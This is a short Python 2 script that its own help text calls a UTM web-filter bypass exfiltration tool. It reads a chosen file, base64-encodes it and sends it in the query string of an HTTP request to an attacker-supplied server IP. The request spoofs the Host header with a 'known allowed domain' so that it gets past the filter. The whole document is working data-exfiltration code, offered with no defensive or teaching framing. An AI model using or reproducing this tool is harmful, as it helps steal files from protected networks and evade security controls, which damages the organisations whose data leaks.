#! /usr/bin/env python

import httplib
import urllib2
import sys
import base64
import argparse
from urllib2 import Request, urlopen, URLError
#from websocket import create_connection

# Main function
def main(ip,host,file):
	content = ''
	for line in open(file):
		content = content + line
	encoded = base64.b64encode(b'%s' % content)

	ip_req = 'http://' + ip + '/hufb/hufb.php?content=' + encoded

	req = urllib2.Request(ip_req)
	req.add_header('Host', host)
	req.add_header('User-agent','MyTest')

	try:
		res = urllib2.urlopen(req)
		html = res.read()
		print html

	except URLError, e:
		if hasattr(e, 'reason'):
        		print 'We failed to reach a server.'
       			print 'Reason: ', e.reason
			print e 
    		elif hasattr(e, 'code'):
        		print 'The server couldn\'t fulfill the request.'
        		print 'Error code: ', e.code
			print e

# Start here
if __name__ == "__main__":
        parser = argparse.ArgumentParser(version="1.0",description="An UTM webfilter bypass exfiltration tool using HTTP.")
        parser.add_argument('server', help='Server IP address', metavar='SERVER_IP')
        parser.add_argument('host', help='Host - known allowed domain', metavar='HOST')
        parser.add_argument('file', help='File to exfiltrate', metavar='FILE')
        args = parser.parse_args()
        main(args.server,args.host,args.file)

